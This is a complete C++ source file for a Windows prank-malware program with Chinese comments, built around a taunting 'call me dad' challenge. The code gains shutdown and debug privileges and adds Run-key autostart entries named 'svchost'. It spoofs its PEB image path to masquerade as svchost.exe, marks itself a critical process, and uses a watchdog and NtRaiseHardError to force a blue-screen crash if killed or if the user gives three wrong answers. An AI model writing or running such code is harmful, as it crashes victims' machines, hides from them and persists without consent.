#include <windows.h>
#include <iostream>
#include <string>
#include <io.h>
#include <fcntl.h>

#pragma comment(lib, "shell32.lib")
// 已通过项目属性设置强制管理员清单，无需 pragma

// 未文档化结构定义（用于修改 PEB）
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG           MaximumLength;
    ULONG           Length;
    ULONG           Flags;
    ULONG           DebugFlags;
    PVOID           ConsoleHandle;
    ULONG           ConsoleFlags;
    PVOID           StandardInput;
    PVOID           StandardOutput;
    PVOID           StandardError;
    UNICODE_STRING  CurrentDirectory;
    UNICODE_STRING  DllPath;
    UNICODE_STRING  ImagePathName;
    UNICODE_STRING  CommandLine;
    PVOID           Environment;
    ULONG           StartingX;
    ULONG           StartingY;
    ULONG           CountX;
    ULONG           CountY;
    ULONG           CountCharsX;
    ULONG           CountCharsY;
    ULONG           FillAttribute;
    ULONG           WindowFlags;
    ULONG           ShowWindowFlags;
    UNICODE_STRING  WindowTitle;
    UNICODE_STRING  DesktopInfo;
    UNICODE_STRING  ShellInfo;
    UNICODE_STRING  RuntimeData;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
} PEB, * PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

// ntdll 未公开函数
typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);

void triggerBSOD();
void takeAllPrivileges();
void enableCriticalProcess(bool enable);
void launchWatchdog();
void stopWatchdog();
void safeExit();
void writeDeathNote();
void countdown(int seconds);
std::wstring sanitizeInput(const std::wstring& raw);
BOOL IsElevated();
void disguiseAsSystemProcess();
void installAutorun();   // ★ 新增：写入开机自启动

// 全局守护线程控制
HANDLE g_hStopEvent = NULL;
HANDLE g_hWatchdogThread = NULL;

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fRet;
}

void takeAllPrivileges() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;
    auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    if (!RtlAdjustPrivilege) return;
    BOOLEAN bEnabled;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled); // SeShutdownPrivilege
    RtlAdjustPrivilege(20, TRUE, FALSE, &bEnabled); // SeDebugPrivilege
}

void enableCriticalProcess(bool enable) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;
    auto RtlSetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
    if (RtlSetProcessIsCritical) {
        BOOLEAN bOld;
        RtlSetProcessIsCritical(enable ? TRUE : FALSE, &bOld, FALSE);
    }
}

void triggerBSOD() {
    BOOLEAN bEnabled;
    ULONG uResp;
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;
    auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    if (!RtlAdjustPrivilege || !NtRaiseHardError) return;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
    NtRaiseHardError((NTSTATUS)0xC0000420, 0, 0, NULL, 6, &uResp);
}

DWORD WINAPI watchdogThread(LPVOID) {
    HANDLE hMain = OpenProcess(SYNCHRONIZE, FALSE, GetCurrentProcessId());
    HANDLE handles[2] = { hMain, g_hStopEvent };
    DWORD ret = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
    if (ret == WAIT_OBJECT_0) {
        triggerBSOD();
    }
    if (hMain) CloseHandle(hMain);
    return 0;
}

void launchWatchdog() {
    if (g_hStopEvent) return;
    g_hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    g_hWatchdogThread = CreateThread(NULL, 0, watchdogThread, NULL, 0, NULL);
}

void stopWatchdog() {
    if (g_hStopEvent) {
        SetEvent(g_hStopEvent);
        if (g_hWatchdogThread) {
            WaitForSingleObject(g_hWatchdogThread, 3000);
            CloseHandle(g_hWatchdogThread);
            g_hWatchdogThread = NULL;
        }
        CloseHandle(g_hStopEvent);
        g_hStopEvent = NULL;
    }
}

void safeExit() {
    enableCriticalProcess(false);
    stopWatchdog();
}

void writeDeathNote() {
    const wchar_t* txtPath = L"你完了.txt";
    HANDLE hFile = CreateFileW(txtPath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    WORD bom = 0xFEFF;
    DWORD written;
    WriteFile(hFile, &bom, sizeof(bom), &written, NULL);
    const wchar_t* note =
        L"你完了！！！\r\n\r\n"
        L"你有3次机会叫爸爸。\r\n"
        L"你一次都没叫。\r\n\r\n"
        L"现在电脑要蓝屏了。\r\n"
        L"自作自受。\r\n\r\n"
        L"——陶修夷 留\r\n";
    WriteFile(hFile, note, (DWORD)(wcslen(note) * sizeof(wchar_t)), &written, NULL);
    CloseHandle(hFile);
    ShellExecuteW(NULL, L"open", txtPath, NULL, NULL, SW_SHOW);
}

void countdown(int seconds) {
    for (int i = seconds; i > 0; i--) {
        std::wcout << L"  " << i << L" 秒后蓝屏..." << std::endl;
        Sleep(1000);
    }
}

std::wstring sanitizeInput(const std::wstring& raw) {
    std::wstring s = raw;
    while (!s.empty() && (s.back() == L' ' || s.back() == L'\r' || s.back() == L'\n' || s.back() == L'\t'))
        s.pop_back();
    size_t start = 0;
    while (start < s.length() && (s[start] == L' ' || s[start] == L'\t'))
        start++;
    s = s.substr(start);
    for (auto& c : s) c = towlower(c);
    return s;
}

void disguiseAsSystemProcess() {
    const wchar_t* fakePath = L"C:\\Windows\\System32\\svchost.exe";

    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;

    typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
        HANDLE, ULONG, PVOID, ULONG, PULONG);
    auto NtQueryInformationProcess = (pNtQueryInformationProcess)
        GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) return;

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        0, // ProcessBasicInformation
        &pbi, sizeof(pbi), &returnLength);
    if (status != 0) return;

    PPEB peb = (PPEB)pbi.PebBaseAddress;
    if (!peb) return;

    PRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;
    if (!params) return;

    size_t len = wcslen(fakePath) * sizeof(wchar_t);
    wchar_t* newBuf = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + sizeof(wchar_t));
    if (!newBuf) return;
    wcscpy_s(newBuf, len / sizeof(wchar_t) + 1, fakePath);

    params->ImagePathName.Buffer = newBuf;
    params->ImagePathName.Length = (USHORT)len;
    params->ImagePathName.MaximumLength = (USHORT)(len + sizeof(wchar_t));

    params->CommandLine.Buffer = newBuf;
    params->CommandLine.Length = (USHORT)len;
    params->CommandLine.MaximumLength = (USHORT)(len + sizeof(wchar_t));

    SetConsoleTitleW(fakePath);
}

// ★ 核心新增：写入开机自启动注册表项
void installAutorun() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // 构造带静默参数的命令行（/silent 可避免弹窗，程序内部可据此跳过等待）
    std::wstring cmdLine = L"\"" + std::wstring(exePath) + L"\" /silent";

    // 写入 HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    // 对所有用户生效，且需要管理员权限（已满足）
    HKEY hKey;
    LONG result = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );
    if (result == ERROR_SUCCESS) {
        RegSetValueExW(
            hKey,
            L"svchost",                // 伪装成系统项
            0,
            REG_SZ,
            (const BYTE*)cmdLine.c_str(),
            (DWORD)((cmdLine.length() + 1) * sizeof(wchar_t))
        );
        RegCloseKey(hKey);
    }

    // 同时写入 HKCU 作为双保险（普通权限也可写，这里用管理员写更稳定）
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"svchost", 0, REG_SZ,
            (const BYTE*)cmdLine.c_str(),
            (DWORD)((cmdLine.length() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

int wmain(int argc, wchar_t* argv[]) {
    (void)_setmode(_fileno(stdout), _O_U16TEXT);
    (void)_setmode(_fileno(stdin), _O_U16TEXT);

    // 检查是否以静默参数启动（/silent），若是则跳过提示直接进入挑战逻辑
    bool silent = false;
    for (int i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"/silent") == 0) {
            silent = true;
            break;
        }
    }

    if (!IsElevated()) {
        std::wcout << L"[!] 未以管理员身份运行，程序无法继续。\n按任意键退出...";
        std::wcin.get();
        return 1;
    }

    takeAllPrivileges();
    installAutorun();               // ★ 写入自启动
    disguiseAsSystemProcess();
    enableCriticalProcess(true);
    launchWatchdog();

    // 静默模式：不显示标题和规则，直接等待用户叫爸爸（无窗口？这里仍保留控制台但隐藏？）
    // 实际运行时，自启动通常不会有用户交互，但程序核心是挑战，这里保持原有逻辑。
    // 若要完全静默，可将控制台设为隐藏，但挑战需要输入，所以还是显示。
    if (!silent) {
        std::wcout << L"==============================\n";
        std::wcout << L"        陶修夷的\n";
        std::wcout << L"   叫 爸 爸 挑 战 赛™\n";
        std::wcout << L"==============================\n";
        std::wcout << L"规则：叫我爸爸，否则你的电脑会哭。\n";
        std::wcout << L"你有 " << 3 << L" 次机会。\n";
        std::wcout << L"注意：别想用任务管理器杀我，你会死得很惨。\n\n";
    }
    else {
        // 静默启动时也显示简短提示，避免用户完全不知道发生了什么
        std::wcout << L"叫爸爸[系统服务] 已启动，请勿关闭此窗口。\n";
    }

    const int MAX_FAIL = 3;
    int fail = 0;

    while (fail < MAX_FAIL) {
        int remaining = MAX_FAIL - fail;
        std::wcout << L"[ 剩余机会: " << remaining << L" ] 叫啊 -> ";
        std::wstring input;
        std::getline(std::wcin, input);
        std::wstring clean = sanitizeInput(input);

        if (clean == L"爸爸" || clean == L"爸" || clean == L"baba") {
            std::wcout << L"\n╔══════════════════╗\n";
            std::wcout << L"║  乖儿子！:)      ║\n";
            std::wcout << L"╚══════════════════╝\n";
            std::wcout << L"你通过了挑战，电脑安全了。\n";
            Sleep(2000);
            safeExit();
            return 0;
        }
        else {
            fail++;
            if (fail < MAX_FAIL) {
                std::wcout << L"呵，死撑。还剩 " << (MAX_FAIL - fail) << L" 次。\n";
            }
        }
    }

    std::wcout << L"\n你选择了死。\n";
    Sleep(800);
    writeDeathNote();
    Sleep(500);

    std::wcout << L"\n╔════════════════════════════╗\n";
    std::wcout << L"║  你完了！！！              ║\n";
    std::wcout << L"║  txt已打开，慢慢欣赏吧。   ║\n";
    std::wcout << L"╚════════════════════════════╝\n\n";

    countdown(3);
    std::wcout << L"再见。\n";
    Sleep(300);
    triggerBSOD();

    while (1) Sleep(60000);
    return 0;
}